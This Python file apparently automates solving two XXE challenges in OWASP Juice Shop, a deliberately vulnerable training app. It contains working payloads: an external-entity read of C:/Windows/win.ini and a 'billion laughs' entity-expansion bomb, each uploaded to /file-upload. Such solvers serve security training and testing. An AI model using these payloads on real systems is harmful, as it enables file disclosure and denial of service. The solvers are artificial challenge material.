"""XXE category solvers (2 of 2). Verified against routes/fileUpload.ts,
lib/xml.ts, and lib/utils.ts (fetched 2026-08-09). Both exploit the same
handleXmlUpload path (POST /file-upload with a .xml file), which parses
with external-entity substitution deliberately enabled
(XML_PARSE_NOENT | XML_PARSE_DTDLOAD) via libxml2-wasm, inside a 2000ms vm
timeout."""
import uuid

from solvers.base import SolverContext, register

DOMAIN = "juice-sh.op"


# --- This project only ever runs on Windows (npm start, never Docker), so
# the classic file:///etc/passwd XXE target doesn't exist here.
# lib/utils.ts's matchesSystemIniFile() checks specifically for the string
# "; for 16-bit app support" — the well-known signature line inside
# Windows' win.ini — confirming file:///C:/Windows/win.ini is the correct
# target on this platform, not /etc/passwd. ---

XXE_FILE_DISCLOSURE_PAYLOAD = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>"""


@register("xxeFileDisclosureChallenge", "XXE", 3)
def solve_xxe_file_disclosure(ctx: SolverContext) -> None:
    email = f"xxefile.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post("/file-upload", files={"file": ("disclosure.xml", XXE_FILE_DISCLOSURE_PAYLOAD.encode(), "application/xml")})


# --- Classic "billion laughs" entity-expansion bomb: 9 levels of 9x
# self-referential entity nesting expands to roughly 9^9 (~387 million)
# copies of the innermost string. With NOENT substitution enabled, libxml2
# must materialize this during parsing, which should burn well past the
# 2000ms vm timeout on any reasonable payload size — this is the starting
# point, not a guaranteed-correct depth/breadth; see the plan's Step 4. ---

XXE_DOS_PAYLOAD = """<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>"""


@register("xxeDosChallenge", "XXE", 5)
def solve_xxe_dos(ctx: SolverContext) -> None:
    email = f"xxedos.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    ctx.client.post("/file-upload", files={"file": ("bomb.xml", XXE_DOS_PAYLOAD.encode(), "application/xml")})
